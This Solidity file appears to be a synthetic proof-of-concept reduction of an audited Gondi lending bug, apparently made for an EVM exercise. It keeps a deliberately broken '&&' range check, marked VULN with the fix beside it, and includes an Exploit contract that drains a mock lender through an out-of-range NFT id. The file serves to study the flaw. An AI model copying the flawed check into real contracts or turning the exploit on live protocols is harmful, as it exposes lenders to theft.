// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — OraclePoolOfferHandler range check never reverts (Code4rena 2024-06, H-03, #35264).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the collateral range test is `id < min && id > max`, which cannot be true.
    A token id outside the configured range still receives that range's principal factors.
    The loan opens against the wrong NFT and pulls the full principal from the lender.
    Audited condition preserved below (@> VULN).

    Repo: code-423n4/2024-06-gondi @ ab1411814ca9323c5d427739f5771d3907dbea31
    OraclePoolOfferHandler._getFactors / validateOffer. */

library Terms {
    uint256 internal constant MIN_ID = 1;
    uint256 internal constant MAX_ID = 10;
    uint256 internal constant BAD_ID = 999;
    uint256 internal constant FLOOR = 10_000 ether;
    uint256 internal constant FACTOR_BPS = 1_000;
    uint256 internal constant PRECISION = 10_000;
    uint256 internal constant PRINCIPAL = 1_000 ether;
    address internal constant COLLECTION = address(uint160(0xC0C0));
    address internal constant LENDER = address(uint160(0xB0B5));
}

contract Asset {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Reduced OraclePoolOfferHandler. Range code uses the audited && check.
contract OraclePoolOfferHandler {
    uint256 public rangeMin;
    uint256 public rangeMax;
    uint256 public floorValue;
    uint256 public factorBps;
    uint256 public constant PRECISION = 10_000;

    error InvalidInputError();
    error InvalidPrincipalAmountError();

    function configure(uint256 minId, uint256 maxId, uint256 floor, uint256 factor) external {
        rangeMin = minId;
        rangeMax = maxId;
        floorValue = floor;
        factorBps = factor;
    }

    function maxPrincipal() public view returns (uint256) {
        return floorValue * factorBps / PRECISION;
    }

    /// Range branch of _getFactors, then the principal cap in validateOffer.
    function validateOffer(uint256 _collateralTokenId, uint256 amount) external view returns (uint256, uint256) {
        uint256 min = rangeMin;
        uint256 max = rangeMax;
        // @> VULN: id < min AND id > max is impossible, so an id outside [min, max] does not revert.
        if (_collateralTokenId < min && _collateralTokenId > max) {
            revert InvalidInputError();
        }
        // FIX: if (_collateralTokenId < min || _collateralTokenId > max) revert InvalidInputError();
        uint256 cap = floorValue * factorBps / PRECISION;
        if (amount > cap) {
            revert InvalidPrincipalAmountError();
        }
        return (amount, cap);
    }
}

/// Opens the loan after the handler accepts the offer, then pulls principal from the lender.
contract MultiSourceLoan {
    Asset public asset;
    OraclePoolOfferHandler public handler;
    address public borrower;
    address public lender;
    uint256 public collateralTokenId;
    uint256 public pulled;
    uint256 public capUsed;

    constructor(Asset _asset, OraclePoolOfferHandler _handler, address _lender) {
        asset = _asset;
        handler = _handler;
        lender = _lender;
        borrower = msg.sender;
    }

    function emitLoan(uint256 tokenId, uint256 amount) external returns (uint256) {
        (uint256 principal, uint256 cap) = handler.validateOffer(tokenId, amount);
        collateralTokenId = tokenId;
        capUsed = cap;
        asset.transferFrom(lender, borrower, principal);
        pulled = principal;
        return collateralTokenId;
    }
}

contract Exploit {
    Asset public asset; // CREATE nonce 1
    OraclePoolOfferHandler public handler; // CREATE nonce 2
    MultiSourceLoan public loan; // CREATE nonce 3

    uint256 public openedId;
    uint256 public pulled;
    uint256 public capUsed;

    constructor() {
        asset = new Asset();
        handler = new OraclePoolOfferHandler();
        loan = new MultiSourceLoan(asset, handler, Terms.LENDER);
    }

    function run() external {
        handler.configure(Terms.MIN_ID, Terms.MAX_ID, Terms.FLOOR, Terms.FACTOR_BPS);
        uint256 cap = handler.maxPrincipal();
        require(cap == Terms.PRINCIPAL, "cap");
        asset.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);

        uint256 id = loan.emitLoan(Terms.BAD_ID, Terms.PRINCIPAL);

        openedId = loan.collateralTokenId();
        pulled = loan.pulled();
        capUsed = loan.capUsed();
        require(id == Terms.BAD_ID, "id");
        require(openedId == Terms.BAD_ID, "nft");
        require(openedId > Terms.MAX_ID, "outside");
        require(pulled == Terms.PRINCIPAL, "pulled");
        require(asset.balanceOf(address(this)) == Terms.PRINCIPAL, "borrower");
        require(asset.balanceOf(Terms.LENDER) == 0, "lender");
        require(capUsed == Terms.PRINCIPAL, "factors");
    }
}
